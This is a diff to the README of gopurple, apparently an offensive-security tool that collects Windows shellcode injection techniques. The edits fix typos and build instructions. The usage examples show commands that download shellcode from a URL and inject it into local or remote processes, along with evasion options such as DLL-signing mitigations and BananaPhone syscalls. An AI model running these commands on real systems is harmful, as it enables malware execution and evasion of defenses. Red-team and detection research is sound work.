@@ -7,9 +7,9 @@ This project is a simple collection of various shell code injection techniques, 
 
 # Installation
 
-1 - Requires [go](https://golang.org/dl/) installed on a windows machine.
+1 - Requires [go](https://golang.org/dl/) installed.
 
-2-  Build the application from the project's directory: go build gopurple.go
+2 - Build the application from the project's directory: `go build`. Set `GOOS=windows` if the build system is not Windows.
 
 
 ```
@@ -34,7 +34,7 @@ This project is a simple collection of various shell code injection techniques, 
         shellcode injection technique to use:
          1: CreateFiber
          2: syscall
-         3: CreatetThreadNative
+         3: CreateThreadNative
          4: CreateProcess
          5: EtwpCreateEtwThread
          6: CreateRemoteThread
@@ -81,19 +81,19 @@ For the sake of clarity, the below demos illustrate different ways of using the 
 
 2 - gopurple.exe -u urlhostingpayload -t 2 (Syscall)
 
-3 - gopurple.exe -u urlhostingpayload -t 3 (CreatetThreadNative)
+3 - gopurple.exe -u urlhostingpayload -t 3 (CreateThreadNative)
 
 4 - gopurple.exe -u urlhostingpayload -t 4 (CreateProcess)
 
 5 - gopurple.exe -u urlhostingpayload -t 5 (EtwpCreateEtwThread)
 
-6 - gopurple.exe -u urlhostingpayload -t 6 -p tagetprocess (CreateRemoteThread)
+6 - gopurple.exe -u urlhostingpayload -t 6 -p targetprocess (CreateRemoteThread)
 
-7 - gopurple.exe -u urlhostingpayload -t 7 -p tagetprocess (RtlCreateUserThread)
+7 - gopurple.exe -u urlhostingpayload -t 7 -p targetprocess (RtlCreateUserThread)
 
-8 - gopurple.exe -u urlhostingpayload -t 8 //(CreateThread)
+8 - gopurple.exe -u urlhostingpayload -t 8 (CreateThread)
 
-9 - gopurple.exe -u urlhostingpayload -t 9 -p tagetprocess (CreateRemoteThreadNative)
+9 - gopurple.exe -u urlhostingpayload -t 9 -p targetprocess (CreateRemoteThreadNative)
 
 10 - gopurple.exe -u urlhostingpayload -t 10 -prog porgram -a processargument (ex:C:\Windows\System32\WindowsPowerShell\v1.0) and processargument(ex:Get-Process)  (CreateProcessWithPipe)
 
@@ -101,25 +101,25 @@ For the sake of clarity, the below demos illustrate different ways of using the 
 
 nonms = only DLLs that are signed by Microsoft can hook into the process
 
-onlystore = only Microsoft store application's process can hook into the process  
+onlystore = only Microsoft store application's process can hook into the process
 
-12 -  gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWait)
- 
+12 - gopurple.exe -u urlhostingpayload -t 12 (CreateThreadpoolWait)
+
 13 - gopurple.exe -u urlhostingpayload -t 13 (BananaPhone)
 ```
 
 
 # Acknowledgments:
 
-All the credits go to following guys for their awesome researches,tools and inspiration: 
+All the credits go to following guys for their awesome researches,tools and inspiration:
 
 * [ne0nd0g](https://twitter.com/ne0nd0g): Most of the codes and techniques
 
 * [spotheplanet](https://twitter.com/spotheplanet): The [blogpost](https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait) inspired me to convert the method to Golang
 
-* [_d00mfist](https://twitter.com/_d00mfist): Great implementation of QueueUserAPC technique in Golang 
+* [_d00mfist](https://twitter.com/_d00mfist): Great implementation of QueueUserAPC technique in Golang
 
-* [c__sto](https://twitter.com/c__sto): Amazing BananPhone technique 
+* [c__sto](https://twitter.com/c__sto): Amazing BananaPhone technique
 
 * [_batsec_](https://twitter.com/_batsec_): The great shad0w
 
